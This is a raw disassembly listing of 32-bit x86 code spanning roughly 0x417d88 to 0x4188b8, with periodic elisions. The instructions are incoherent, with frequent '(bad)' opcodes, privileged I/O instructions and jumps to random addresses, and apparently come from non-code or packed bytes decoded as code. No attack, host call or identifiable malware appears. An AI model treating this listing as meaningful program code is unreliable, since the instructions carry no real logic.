  417d88:	out    dx,eax
  417d89:	call   0xe7750dce
  417d8e:	push   es
  417d8f:	jg     0x417d66
  417d91:	in     al,0x31
  417d93:	cdq    
  417d94:	add    al,0xb7
  417d96:	enter  0xb86f,0xcd
  417d9a:	imul   bp,si,0x8279
  417d9f:	idiv   ebx
  417da1:	inc    eax
  417da2:	mov    bh,BYTE PTR [edi]
  417da4:	addr16 dec ebx
  417da6:	sbb    BYTE PTR ds:[edx-0x32cd12ba],dh
  417dad:	shl    BYTE PTR [esp+edi*4+0x7538b961],0x37
  417db5:	xor    BYTE PTR [esi],ah
  417db7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417db8:	in     eax,0xf9
  417dba:	push   0x171a903d
  417dbf:	mov    esi,0xca30
	...
  417e34:	mov    edi,0xae6d8e19
  417e39:	(bad)  
  417e3a:	(bad)  
  417e3b:	(bad)  
  417e3d:	xlat   BYTE PTR ds:[ebx]
  417e3e:	aam    0xef
  417e40:	mov    eax,ds:0x4c6c53da
  417e45:	add    al,0x1
  417e47:	add    dh,dh
  417e49:	add    BYTE PTR [eax],al
  417e4b:	add    BYTE PTR [esi],dh
  417e4d:	loopne 0x417e5f
  417e4f:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e51:	jmp    0xd996daaa
  417e56:	push   ebx
  417e57:	popf   
  417e58:	pop    ebp
  417e59:	in     al,0x12
  417e5b:	sar    BYTE PTR [ecx-0x1cb80cae],cl
  417e61:	(bad)  
  417e63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e64:	(bad)  
  417e65:	neg    DWORD PTR [eax-0x3d]
  417e68:	scas   al,BYTE PTR es:[edi]
  417e69:	or     DWORD PTR [ebx-0x4530011e],ebx
  417e6f:	add    DWORD PTR [edx],ebx
  417e71:	in     eax,dx
  417e72:	fldcw  WORD PTR [esi+0x4d216e67]
  417e78:	pop    edi
  417e79:	push   0x5564a030
  417e7e:	std    
  417e7f:	push   edi
  417e80:	push   ds
  417e81:	push   ebp
  417e82:	xor    dh,BYTE PTR [ebx+edx*2]
  417e85:	shl    ah,1
  417e87:	cmp    eax,edi
  417e89:	xchg   ecx,eax
  417e8a:	and    eax,0x42d42f5f
  417e8f:	outs   dx,BYTE PTR ds:[esi]
  417e90:	mov    ch,0xb6
  417e92:	mov    BYTE PTR [edi-0x2e19e1e],dh
  417e98:	stc    
  417e99:	mov    ebx,0xaf27422d
  417e9e:	xor    eax,0x52feee9d
  417ea3:	xor    BYTE PTR [edi-0x7f],cl
  417ea6:	inc    ecx
  417ea7:	mov    edi,ds
  417ea9:	hlt    
  417eaa:	cwde   
  417eab:	clc    
  417eac:	stc    
  417ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417eae:	dec    eax
  417eaf:	neg    DWORD PTR [ebp+0x1b0e0ec0]
  417eb5:	mov    ch,0xdb
  417eb7:	ret    0xd0b
  417eba:	adc    al,0x0
  417ebc:	ins    BYTE PTR es:[edi],dx
  417ebd:	push   edi
  417ebe:	mov    ds:0x95500db5,al
  417ec3:	cmp    BYTE PTR [ecx-0x617b3b35],dl
  417ec9:	inc    ebp
  417eca:	loop   0x417e4f
  417ecc:	div    BYTE PTR [ebx+0x52]
  417ecf:	jbe    0x417f4d
  417ed1:	retf   
  417ed2:	mov    bl,BYTE PTR [ebx+0x77a469db]
  417ed8:	clc    
  417ed9:	or     eax,0x50e19034
  417ede:	add    eax,0x423fe68e
  417ee3:	mov    DWORD PTR [esi],ecx
  417ee5:	inc    edi
  417ee6:	lahf   
  417ee7:	aas    
  417ee8:	repnz and BYTE PTR [esi+0x70f77496],dh
  417eef:	push   eax
  417ef0:	(bad)  
  417ef2:	daa    
  417ef3:	jmp    0x70bace1b
  417ef8:	gs dec ebp
  417efa:	mov    cl,bh
  417efc:	adc    al,0xc7
  417efe:	push   cs
  417eff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f00:	mov    dh,0xb2
  417f02:	leave  
  417f03:	dec    ecx
  417f04:	rcl    bh,0x51
  417f07:	retf   
  417f08:	call   DWORD PTR [esi]
  417f0a:	jns    0x417eb3
  417f0c:	sub    al,ch
  417f0e:	cmp    DWORD PTR [eax-0x3a],ecx
  417f11:	push   edx
  417f12:	and    BYTE PTR [eax+0x4e08bbb1],al
  417f18:	xchg   edx,eax
  417f19:	call   FWORD PTR [esi]
  417f1b:	loope  0x417f8b
  417f1d:	or     esi,DWORD PTR [esi+0x6e2ff3a6]
  417f23:	lods   eax,DWORD PTR cs:[esi]
  417f25:	xchg   ebx,eax
  417f26:	xor    DWORD PTR [ecx-0x58],esp
  417f29:	inc    esp
  417f2a:	add    esp,ebx
  417f2c:	push   ebx
  417f2d:	ror    dh,cl
  417f2f:	fisttp DWORD PTR [ecx+ebp*8-0x2e]
  417f33:	xor    dh,BYTE PTR [ebx]
  417f35:	xor    ah,bh
  417f37:	jmp    0xb45d5e1d
  417f3c:	repnz stc 
  417f3e:	aam    0xc4
  417f40:	call   FWORD PTR ds:0x0
	...
  417fb2:	add    BYTE PTR [eax],al
  417fb4:	jbe    0x417fe3
  417fb6:	push   ebp
  417fb7:	inc    ecx
  417fb8:	pop    edi
  417fb9:	jns    0x418031
  417fbb:	aas    
  417fbc:	fisttp DWORD PTR [esi-0x68]
  417fbf:	inc    edx
  417fc0:	mov    esi,0x422b87bd
  417fc5:	add    eax,0xf60001
  417fca:	add    BYTE PTR [eax],al
  417fcc:	mov    eax,0x77eba138
  417fd1:	and    DWORD PTR [edx],0xffffffce
  417fd4:	outs   dx,DWORD PTR ds:[esi]
  417fd5:	nop
  417fd6:	jg     0x417f60
  417fd8:	ja     0x417fc5
  417fda:	rcl    DWORD PTR [ecx-0x52bee5a1],0xa3
  417fe1:	js     0x41802d
  417fe3:	inc    dl
  417fe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fe6:	dec    esi
  417fe7:	cwde   
  417fe8:	out    0x5b,eax
  417fea:	mov    dl,0xde
  417fec:	sar    esi,1
  417fee:	sbb    eax,0xc92ae12a
  417ff3:	jle    0x417ffb
  417ff5:	add    BYTE PTR [eax+0x41d2444d],ch
  417ffb:	sbb    edx,esp
  417ffd:	mov    esi,0xe7c30917
  418002:	add    ebp,0xd13364a8
  418008:	ret    
  418009:	mov    esp,0x6c4f7f97
  41800e:	(bad)  
  41800f:	xchg   ecx,eax
  418010:	rcr    BYTE PTR [ecx],1
  418012:	lahf   
  418013:	out    0x26,al
  418015:	jbe    0x417fb6
  418017:	mov    ds:0xedb70d61,eax
  41801c:	ja     0x418067
  41801e:	sub    bh,BYTE PTR [edx]
  418020:	outs   dx,BYTE PTR ds:[esi]
  418021:	out    0x18,al
  418023:	jae    0x418042
  418025:	rol    cl,cl
  418027:	xchg   esp,ebx
  418029:	or     ch,cl
  41802b:	sbb    DWORD PTR [esi],ecx
  41802d:	stc    
  41802e:	inc    eax
  41802f:	jns    0x41807d
  418031:	stc    
  418032:	nop
  418033:	or     ecx,DWORD PTR [edi-0xfec8f70]
  418039:	dec    eax
  41803a:	pop    esp
  41803b:	imul   ebp,DWORD PTR [edi+esi*1+0x48],0x12
  418040:	jno    0x41801f
  418042:	outs   dx,BYTE PTR ds:[esi]
  418043:	shl    DWORD PTR [ecx+0x61a1e8e7],0xee
  41804a:	call   0x991799cf
  41804f:	fisttp DWORD PTR [edi]
  418051:	bound  eax,QWORD PTR [edi]
  418053:	xor    cl,ch
  418055:	dec    ecx
  418056:	add    eax,DWORD PTR [esi]
  418058:	push   ecx
  418059:	adc    eax,0x8129426f
  41805e:	dec    ecx
  41805f:	dec    esp
  418060:	mov    esi,0xa8489493
  418065:	hlt    
  418066:	lahf   
  418067:	or     al,0x6a
  418069:	mov    cl,0x2f
  41806b:	fwait
  41806c:	push   ds
  41806d:	jmp    esp
  41806f:	mov    esi,0xbad0ece7
  418074:	push   cs
  418075:	ret    
  418076:	scas   al,BYTE PTR es:[edi]
  418077:	shl    DWORD PTR [ebx-0x4b],cl
  41807a:	inc    esp
  41807b:	inc    ebp
  41807c:	or     al,0x47
  41807e:	cdq    
  41807f:	ins    BYTE PTR es:[edi],dx
  418080:	jle    0x41807e
  418082:	loopne 0x4180a5
  418084:	fidiv  WORD PTR [eax-0x285f4ee]
  41808a:	mov    DWORD PTR [ebp-0x4eeb7b9c],ebp
  418090:	sbb    eax,0xed093eb
  418095:	dec    esi
  418096:	data16 xchg bx,ax
  418099:	add    eax,0x21b24d15
  41809e:	ror    BYTE PTR [ebp-0x569cfc00],1
  4180a4:	jl     0x418122
  4180a6:	xchg   edi,eax
  4180a7:	push   ecx
  4180a8:	cdq    
  4180a9:	cld    
  4180aa:	mul    DWORD PTR [edx]
  4180ac:	push   eax
  4180ad:	(bad)  
  4180ae:	dec    esi
  4180af:	mov    ds:0xd7cfe4e7,eax
  4180b4:	mov    dl,0x9e
  4180b6:	inc    edx
  4180b7:	ins    DWORD PTR es:[edi],dx
  4180b8:	jge    0x418134
  4180ba:	in     al,0xc9
  4180bc:	shr    DWORD PTR [esi],0x90
  4180bf:	jne    0x41805b
  4180c1:	mov    ds:0x0,eax
	...
  418132:	add    BYTE PTR [eax],al
  418134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418135:	sbb    DWORD PTR [eax+0x1a],esi
  418138:	(bad)  
  418139:	jnp    0x418129
  41813b:	mov    ebp,0xe8ea9e45
  418140:	aaa    
  418141:	pop    ebp
  418143:	mov    ds:0x10638,al
  418148:	test   BYTE PTR [eax],0x0
  41814b:	add    ah,al
  41814d:	sbb    dl,BYTE PTR [ecx+0x20]
  418150:	pop    edi
  418151:	mov    ah,0xe7
  418153:	out    0xe0,al
  418155:	inc    esp
  418156:	add    esp,DWORD PTR [eax+0x8c2a6e6]
  41815c:	cs (bad) 
  41815e:	or     esi,esi
  418160:	mov    esp,0xecd1712c
  418165:	cmp    BYTE PTR [ecx],ah
  418167:	std    
  418168:	das    
  418169:	adc    eax,DWORD PTR [edi]
  41816b:	xchg   edx,eax
  41816c:	ja     0x418192
  41816e:	retf   
  41816f:	(bad)  
  418170:	mov    edx,0xf641305e
  418175:	lds    ecx,FWORD PTR [esi+0x6305d499]
  41817b:	mov    ecx,0xe18b455c
  418180:	xlat   BYTE PTR ds:[ebx]
  418181:	(bad)  
  418184:	dec    ebx
  418185:	add    al,0x19
  418187:	mov    WORD PTR [esi],cs
  418189:	mov    ah,0x19
  41818b:	pop    eax
  41818c:	dec    edx
  41818d:	push   0xfffffffd
  41818f:	cli    
  418190:	or     al,0xc3
  418192:	and    cl,dl
  418194:	add    BYTE PTR [eax-0x14373bec],0xcc
  41819b:	sub    al,BYTE PTR [ebx]
  41819d:	fcmovne st,st(0)
  41819f:	add    eax,0x39fb9f27
  4181a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181a5:	push   edi
  4181a6:	shl    BYTE PTR [ebx+ebx*4-0x40],1
  4181aa:	dec    eax
  4181ab:	(bad)  
  4181ad:	and    al,BYTE PTR fs:[ecx]
  4181b0:	or     eax,0xb28749a4
  4181b5:	and    al,0x62
  4181b7:	cmovg  edx,DWORD PTR [edi+eax*4]
  4181bb:	(bad)  
  4181bc:	jmp    0x1f3c:0xfef9f615
  4181c3:	mov    dh,0x32
  4181c5:	out    0xca,eax
  4181c7:	mov    bl,0xd8
  4181c9:	mov    eax,0xb2f0e97f
  4181ce:	daa    
  4181cf:	push   edx
  4181d0:	inc    esi
  4181d1:	lock add al,al
  4181d4:	inc    esp
  4181d5:	and    bh,BYTE PTR [ecx]
  4181d7:	fcomp  DWORD PTR [eax+0x67]
  4181da:	arpl   WORD PTR ds:[esi],bx
  4181dd:	dec    ecx
  4181de:	jbe    0x41825d
  4181e0:	xchg   edi,eax
  4181e1:	jo     0x4181bd
  4181e3:	fild   QWORD PTR [ebx+0x3caf850]
  4181e9:	(bad)  
  4181ea:	je     0x41817e
  4181ec:	sbb    BYTE PTR [eax+0x2d],al
  4181ef:	sbb    eax,ecx
  4181f1:	ds test eax,0x237abdb9
  4181f7:	xchg   edi,eax
  4181f8:	inc    ebx
  4181f9:	lahf   
  4181fa:	dec    ebp
  4181fb:	and    al,BYTE PTR [eax-0x7d]
  4181fe:	pop    edi
  4181ff:	inc    edx
  418200:	lds    ebx,FWORD PTR [ebp-0x1582a156]
  418206:	rdmsr  
  418208:	into   
  418209:	inc    edx
  41820a:	cmp    eax,0x67f5dfd4
  41820f:	sub    al,0xd6
  418211:	shl    DWORD PTR [ecx-0x73],0xb8
  418215:	das    
  418216:	xchg   esp,eax
  418217:	jnp    0x4181ea
  418219:	lock mov esp,0x89027ccb
  41821f:	jmp    0x418234
  418221:	and    BYTE PTR [ebx-0x52],bl
  418224:	xlat   BYTE PTR ds:[ebx]
  418225:	cmp    BYTE PTR [ecx-0x3b],ah
  418228:	mov    bh,dh
  41822a:	(bad)  
  41822b:	fstp   TBYTE PTR [edx+0x83004e7]
  418231:	fwait
  418232:	push   edx
  418233:	mov    eax,ds:0xd395c6e2
  418238:	jbe    0x418209
  41823a:	adc    DWORD PTR [ebx+ebp*8],esi
  41823d:	mov    al,ds:0xade3b3d5
	...
  4182b2:	add    BYTE PTR [eax],al
  4182b4:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x3ef3ecbf
  4182bf:	adc    esp,esp
  4182c1:	fsub   st,st(2)
  4182c3:	loop   0x4182f3
  4182c5:	pop    es
  4182c6:	add    DWORD PTR [eax],eax
  4182c8:	test   BYTE PTR [eax],0x0
  4182cb:	add    BYTE PTR [ecx+0x30abe154],dl
  4182d1:	ror    DWORD PTR [esi-0x3ad8a796],1
  4182d7:	adc    ecx,DWORD PTR ds:0x5d5aa2a1
  4182dd:	push   ds
  4182de:	les    esp,FWORD PTR [edx]
  4182e0:	stc    
  4182e1:	outs   dx,DWORD PTR ds:[esi]
  4182e2:	add    BYTE PTR [ebx-0x14784397],bh
  4182e8:	jmp    0x9a994d66
  4182ed:	sbb    BYTE PTR ds:0x7ff88e6e,0x67
  4182f4:	ins    DWORD PTR es:[edi],dx
  4182f5:	or     edi,edi
  4182f7:	push   edx
  4182f8:	mov    ecx,0xa155e16d
  4182fd:	push   esp
  4182fe:	clc    
  4182ff:	or     edx,DWORD PTR [esi+0x3f83d672]
  418305:	pop    ebx
  418306:	fld    DWORD PTR [edi+0x2b]
  418309:	add    BYTE PTR [ebp-0x2b072cb2],cl
  41830f:	jnp    0x41835d
  418311:	jae    0x4182d7
  418313:	adc    al,0xbc
  418315:	jno    0x418323
  418317:	cli    
  418318:	push   0x636af12e
  41831d:	jmp    0xd78c:0x9e799f01
  418324:	lods   al,BYTE PTR ds:[esi]
  418325:	ss cs mov dh,0x9e
  418329:	cmp    eax,0x74014c2d
  41832e:	stos   BYTE PTR es:[edi],al
  41832f:	push   edx
  418330:	and    eax,0x74bf9ff8
  418335:	jne    0x418308
  418337:	pop    ebp
  418338:	cmp    al,0xad
  41833a:	fsubr  st(2),st
  41833c:	jle    0x4182bf
  41833e:	and    edi,DWORD PTR [esi-0xb]
  418341:	push   0xb7747184
  418346:	leave  
  418347:	adc    al,0x84
  418349:	fild   QWORD PTR [ebx]
  41834b:	imul   esp,DWORD PTR [ecx-0x13],0xfffffffd
  41834f:	icebp  
  418350:	or     edi,DWORD PTR [ebx+edx*4+0x52]
  418354:	retf   
  418355:	ja     0x41836a
  418357:	imul   esi,ecx,0x711d72fa
  41835d:	aas    
  41835e:	test   BYTE PTR [edx+0x5d2142e2],ch
  418364:	ins    BYTE PTR es:[edi],dx
  418365:	fwait
  418366:	daa    
  418367:	adc    eax,0x924ad6d1
  41836c:	sbb    BYTE PTR [ecx],0x4a
  41836f:	xchg   esp,eax
  418370:	(bad)  
  418371:	hlt    
  418372:	enter  0xf4d,0xc8
  418376:	xchg   DWORD PTR [ebp-0x18],ebp
  418379:	xor    ecx,DWORD PTR [ebx+0x77c6086a]
  41837f:	adc    BYTE PTR [ecx-0x5494681],dh
  418385:	jne    0x4183b7
  418387:	add    cl,bh
  418389:	and    edx,DWORD PTR [ebp-0x41]
  41838c:	call   0x5e7da09e
  418391:	xchg   ebp,eax
  418392:	and    al,0x4c
  418394:	and    BYTE PTR [ecx+edi*4+0x2b],cl
  418398:	arpl   bx,cx
  41839a:	into   
  41839b:	rol    DWORD PTR [eax+0x73],0x8d
  41839f:	cmp    al,0x27
  4183a1:	mov    al,ds:0xe4f1c982
  4183a6:	cmp    al,BYTE PTR [esi+0x4a]
  4183a9:	pop    edx
  4183aa:	fdivr  st(6),st
  4183ac:	xor    DWORD PTR [ecx-0x5e3f9da3],esi
  4183b2:	mov    esp,0x5bc3289c
  4183b7:	pop    edi
  4183b8:	dec    ebp
  4183b9:	(bad)  
  4183ba:	call   0x26749d23
  4183bf:	sar    DWORD PTR [edi+0x7c],cl
	...
  418432:	add    BYTE PTR [eax],al
  418434:	xchg   ecx,eax
  418435:	mov    edx,0xdc6b0c6a
  41843a:	idiv   DWORD PTR [edi-0x233270d3]
  418440:	dec    eax
  418441:	sbb    edx,DWORD PTR [ebx]
  418443:	cmp    ah,BYTE PTR [eax+ecx*1]
  418446:	add    DWORD PTR [eax],eax
  418448:	test   BYTE PTR [eax],0x0
  41844b:	add    BYTE PTR [eax],dh
  41844d:	pop    edi
  41844e:	mov    cl,0x54
  418450:	outs   dx,DWORD PTR ds:[esi]
  418451:	pop    ebx
  418452:	aam    0x6e
  418454:	in     al,dx
  418455:	jb     0x418453
  418457:	imul   eax,DWORD PTR [edx],0x31
  41845a:	jl     0x4184c3
  41845c:	repnz loope 0x41842a
  41845f:	cmp    eax,DWORD PTR [eax+eiz*8-0x37cd69d6]
  418466:	mov    bh,0xa3
  418468:	sti    
  418469:	mov    eax,ds:0x6723b3f9
  41846e:	inc    eax
  41846f:	jae    0x418428
  418471:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418472:	jmp    0x4184dc
  418474:	std    
  418475:	xor    eax,0x4ee0de8a
  41847a:	cmp    edi,edx
  41847c:	mov    BYTE PTR [edx],0x3f
  41847f:	(bad)  
  418480:	(bad)  
  418481:	loopne 0x418499
  418483:	mov    edi,eax
  418485:	aaa    
  418486:	stos   DWORD PTR es:[edi],eax
  418487:	sbb    DWORD PTR [ebx+0x6c],ecx
  41848a:	retf   0x8879
  41848d:	mov    al,ds:0xe5d3a848
  418492:	mov    WORD PTR ds:0xa8f9383d,ss
  418498:	xor    al,BYTE PTR [edx+0x1]
  41849b:	add    eax,0x8060fdc4
  4184a0:	sub    eax,eax
  4184a2:	push   ss
  4184a3:	(bad)  
  4184a4:	retf   
  4184a5:	loopne 0x418524
  4184a7:	ins    BYTE PTR es:[edi],dx
  4184a8:	ret    
  4184a9:	mov    dh,0x1
  4184ab:	push   ss
  4184ac:	lods   eax,DWORD PTR ds:[esi]
  4184ad:	jae    0x418482
  4184af:	in     eax,dx
  4184b0:	and    eax,0xd3f94cc6
  4184b5:	jnp    0x418524
  4184b7:	leave  
  4184b8:	dec    esi
  4184b9:	ficomp DWORD PTR [esi+0x18e21356]
  4184bf:	sub    cl,bl
  4184c1:	(bad)  
  4184c2:	xchg   esp,eax
  4184c3:	dec    esi
  4184c4:	jb     0x4184c2
  4184c6:	jno    0x41848c
  4184c8:	ja     0x41846e
  4184ca:	iret   
  4184cb:	mov    bh,0xa8
  4184cd:	mov    ecx,0xd860cea
  4184d2:	fnstcw WORD PTR [ebp-0xc3afe56]
  4184d8:	fcmovnb st,st(7)
  4184da:	outs   dx,BYTE PTR ds:[esi]
  4184db:	adc    al,0xf6
  4184dd:	stc    
  4184de:	out    dx,eax
  4184df:	xchg   ebp,eax
  4184e0:	xor    ebx,DWORD PTR [ebx]
  4184e2:	sub    bh,ah
  4184e4:	(bad)  
  4184e5:	loopne 0x4184d8
  4184e7:	lods   al,BYTE PTR ds:[esi]
  4184e8:	pop    ss
  4184e9:	adc    bh,BYTE PTR [esi]
  4184eb:	pushf  
  4184ec:	or     BYTE PTR [ebp+0x6d123cf0],0xcc
  4184f3:	div    DWORD PTR [edx]
  4184f5:	out    0xa0,eax
  4184f7:	sbb    DWORD PTR [esi],ecx
  4184f9:	unpcklps xmm5,XMMWORD PTR [ebp+0x3d]
  4184fd:	push   ebx
  4184fe:	iret   
  4184ff:	rol    BYTE PTR [esi],0xd7
  418502:	icebp  
  418503:	stc    
  418504:	sbb    eax,0xb1f5c023
  418509:	scas   al,BYTE PTR es:[edi]
  41850a:	pop    edx
  41850b:	inc    esi
  41850c:	sahf   
  41850d:	pushf  
  41850e:	mov    ebx,0x87264c8b
  418513:	scas   al,BYTE PTR es:[edi]
  418514:	(bad)  
  418515:	cmp    bh,ah
  418517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418518:	xchg   edx,eax
  418519:	inc    edx
  41851a:	loope  0x41849e
  41851c:	rol    DWORD PTR [edx+0x1e],0x61
  418520:	movlps xmm6,QWORD PTR [ebp-0x266f9987]
  418527:	aaa    
  418528:	inc    eax
  418529:	jle    0x418552
  41852b:	mov    ecx,0x835ab6f9
  418530:	ret    0x2cc1
  418533:	imul   DWORD PTR [edx-0x7a]
  418536:	add    ah,BYTE PTR [esi+eiz*4]
  418539:	iret   
  41853a:	out    0xc2,al
  41853c:	xchg   esi,eax
  41853d:	out    dx,al
  41853e:	push   ecx
  41853f:	push   ebx
  418540:	repnz lea eax,[eax]
	...
  4185b3:	add    BYTE PTR [ecx-0x20b02c99],ch
  4185b9:	(bad)  
  4185ba:	mov    ebp,0x15c03be7
  4185bf:	stc    
  4185c0:	aaa    
  4185c1:	xor    DWORD PTR fs:[edx+ebx*1-0x9fffef7],eax
  4185c9:	add    BYTE PTR [eax],al
  4185cb:	add    BYTE PTR [ebp-0x538c91c1],dl
  4185d1:	push   es
  4185d2:	jp     0x418625
  4185d4:	or     eax,0x1a5004a9
  4185d9:	push   es
  4185da:	push   es
  4185db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185dc:	call   0xf04d3088
  4185e1:	xchg   esp,eax
  4185e2:	mov    al,ds:0x972b1755
  4185e7:	ss sbb al,0x83
  4185ea:	mov    ecx,0x2249c4b5
  4185ef:	addr16 pop ecx
  4185f1:	and    eax,0x754b5b43
  4185f6:	jae    0x41857b
  4185f8:	and    esi,DWORD PTR [esi]
  4185fa:	enter  0x384a,0x5c
  4185fe:	ret    
  4185ff:	in     eax,dx
  418600:	stos   DWORD PTR es:[edi],eax
  418601:	int    0xaf
  418603:	(bad)  
  418604:	pop    ebp
  418605:	lods   al,BYTE PTR ds:[esi]
  418606:	jmp    0x4185c1
  418608:	cmc    
  418609:	mov    dh,BYTE PTR [eax-0x122b387f]
  41860f:	stc    
  418610:	hlt    
  418611:	jnp    0x4185ee
  418613:	sti    
  418614:	dec    ebp
  418615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418616:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418617:	repnz iret 
  418619:	mov    al,ds:0x3a4ff2cb
  41861e:	pop    edx
  41861f:	mov    DWORD PTR [ebx],esp
  418621:	aam    0x15
  418623:	call   0x446b92b9
  418628:	mov    bh,0xc5
  41862a:	stos   DWORD PTR es:[edi],eax
  41862b:	lds    ebx,FWORD PTR [ebx+0x25]
  41862e:	xor    eax,0x1b577cc5
  418633:	cmp    eax,0x663ffe95
  418638:	mov    cl,0xdc
  41863a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41863b:	in     eax,0x4c
  41863d:	(bad)  
  41863e:	add    BYTE PTR es:[edi-0x55adf0dc],ch
  418645:	inc    edx
  418646:	lods   al,BYTE PTR ds:[esi]
  418647:	loope  0x41866c
  418649:	stos   BYTE PTR es:[edi],al
  41864a:	mov    edx,0xf3779cd7
  41864f:	add    BYTE PTR [esi+0x3a],al
  418652:	add    bl,BYTE PTR [edx-0x21fc5790]
  418658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418659:	mov    BYTE PTR [edi],dh
  41865b:	sub    eax,0x56ad350e
  418660:	je     0x4186b9
  418662:	int3   
  418663:	outs   dx,BYTE PTR ds:[esi]
  418664:	test   DWORD PTR [ebp+0x7a],esp
  418667:	lods   al,BYTE PTR ds:[esi]
  418668:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418669:	mov    cs,WORD PTR ds:0x9b545818
  41866f:	lds    esi,FWORD PTR [eax-0x27]
  418672:	xchg   edi,eax
  418673:	sbb    esp,ebp
  418675:	aas    
  418676:	outs   dx,DWORD PTR ds:[esi]
  418677:	aaa    
  418678:	out    dx,al
  418679:	add    BYTE PTR [edx+eax*1+0x1df4002e],bl
  418680:	mov    ds:0x27273f49,al
  418685:	cmp    eax,0x856a831b
  41868a:	xor    BYTE PTR [edx+0x51a56aab],cl
  418690:	dec    esp
  418691:	(bad)  
  418692:	loop   0x4186ef
  418694:	adc    eax,0x7510ffe4
  418699:	xchg   ebx,eax
  41869a:	fucomip st,st(2)
  41869c:	aam    0x66
  41869e:	xchg   BYTE PTR [ebx+ecx*8-0x12],bh
  4186a2:	inc    ecx
  4186a3:	mov    ah,0xb
  4186a5:	or     BYTE PTR [ebx+0x16],dl
  4186a8:	inc    edx
  4186a9:	xchg   ch,bl
  4186ab:	adc    esi,eax
  4186ad:	cmp    edx,ecx
  4186af:	push   0x2b
  4186b1:	pop    ds
  4186b2:	push   ecx
  4186b3:	addr16 jb 0x418732
  4186b6:	pop    eax
  4186b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186b8:	call   DWORD PTR [edi+esi*4+0x1952442d]
  4186bf:	shr    BYTE PTR [ebp+0x67],0x0
	...
  418732:	add    BYTE PTR [eax],al
  418734:	jmp    0xff598547
  418739:	imul   ecx
  41873b:	(bad)  
  41873c:	pop    ds
  41873d:	sub    ah,0x2b
  418740:	(bad)  
  418741:	fcomip st,st(0)
  418743:	fcom   QWORD PTR [eax]
  418745:	or     al,BYTE PTR [ecx]
  418747:	add    dh,dh
  418749:	add    BYTE PTR [eax],al
  41874b:	add    BYTE PTR [ebx],dh
  41874d:	push   edx
  41874e:	ja     0x41871d
  418750:	das    
  418751:	in     al,0xff
  418753:	mov    ecx,0x63f0c718
  418758:	es loopne 0x41876f
  41875b:	cld    
  41875c:	fisttp WORD PTR [ebx+0x2a12cf9c]
  418762:	call   0xa3e4:0xe42e16c4
  418769:	mov    dl,0xc1
  41876b:	adc    bl,bh
  41876d:	mov    ah,BYTE PTR [edi]
  41876f:	mov    dh,0x6
  418771:	xor    al,0x78
  418773:	div    eax
  418775:	ins    DWORD PTR es:[edi],dx
  418776:	ds pop esp
  418778:	lahf   
  418779:	xchg   esp,eax
  41877a:	sbb    edi,DWORD PTR [ecx+0x45]
  41877d:	nop
  41877e:	int3   
  41877f:	rcr    DWORD PTR [ebp+0x68],0x38
  418783:	aam    0x79
  418785:	in     eax,0xb6
  418787:	daa    
  418788:	cmp    DWORD PTR [esi],ebx
  41878a:	pop    es
  41878b:	inc    eax
  41878c:	adc    BYTE PTR [esi-0x28],cl
  41878f:	adc    al,0xb6
  418791:	icebp  
  418792:	(bad)  
  418793:	sub    edi,DWORD PTR [ebx-0x58]
  418796:	add    DWORD PTR [edx+0x536d562],edx
  41879c:	xchg   ebp,eax
  41879d:	sub    BYTE PTR [esi],dh
  41879f:	push   edi
  4187a0:	mov    ecx,0xbdf4b5b3
  4187a5:	push   edi
  4187a6:	in     al,0xf8
  4187a8:	(bad)  [ebx-0x12533c24]
  4187ae:	push   edi
  4187af:	push   cs
  4187b0:	jb     0x418748
  4187b2:	jmp    0x5bb2:0x12645163
  4187b9:	loop   0x4187f8
  4187bb:	xor    DWORD PTR ds:0xad8193ed,esp
  4187c1:	mov    ebp,ds
  4187c3:	adc    al,0x29
  4187c5:	ds jmp 0xa97f1733
  4187cb:	mov    esi,0x98f5f25f
  4187d0:	mov    edx,0xe3d7af36
  4187d5:	popf   
  4187d6:	mov    edx,0x6fc15ce1
  4187db:	pop    ebx
  4187dc:	inc    esp
  4187dd:	push   es
  4187de:	xchg   DWORD PTR [bp+di+0x60ca],esi
  4187e3:	xchg   DWORD PTR ds:0x17664883,ebx
  4187ea:	(bad)  
  4187eb:	ins    DWORD PTR es:[edi],dx
  4187ec:	xchg   DWORD PTR [eax+0x5a],edx
  4187ef:	popa   
  4187f0:	out    0x3d,eax
  4187f2:	js     0x418832
  4187f4:	fild   QWORD PTR es:[edi-0xb12f906]
  4187fb:	sub    BYTE PTR [ebp-0x4adb117c],bl
  418801:	in     al,0x22
  418803:	add    BYTE PTR [ecx+edi*8+0x408bff0],dh
  41880a:	out    0x8d,eax
  41880c:	pop    es
  41880d:	ror    BYTE PTR es:[eax+0x4ef5e2e7],1
  418814:	push   ecx
  418815:	cmp    ebp,ebx
  418817:	push   ecx
  418818:	adc    eax,0x3802674
  41881d:	fwait
  41881e:	xchg   edi,eax
  41881f:	push   ss
  418820:	sahf   
  418821:	int3   
  418822:	mov    cl,0xe8
  418824:	xchg   esi,eax
  418825:	push   ebp
  418826:	outs   dx,BYTE PTR ds:[esi]
  418827:	pusha  
  418828:	ja     0x418821
  41882a:	enter  0x28b2,0x5e
  41882e:	xchg   ebx,esp
  418830:	loop   0x418850
  418832:	je     0xce02bedf
  418838:	sub    ch,BYTE PTR [edx+0x5e5f84ef]
  41883e:	in     al,dx
  41883f:	outs   dx,BYTE PTR ds:[esi]
  418840:	and    edi,DWORD PTR [ecx+0x0]
	...
  4188b2:	add    BYTE PTR [eax],al
  4188b4:	pop    eax
  4188b5:	inc    ecx
  4188b6:	pop    ds
  4188b7:	lods   eax,DWORD PTR ds:[esi]
  4188b8:	pop    ds
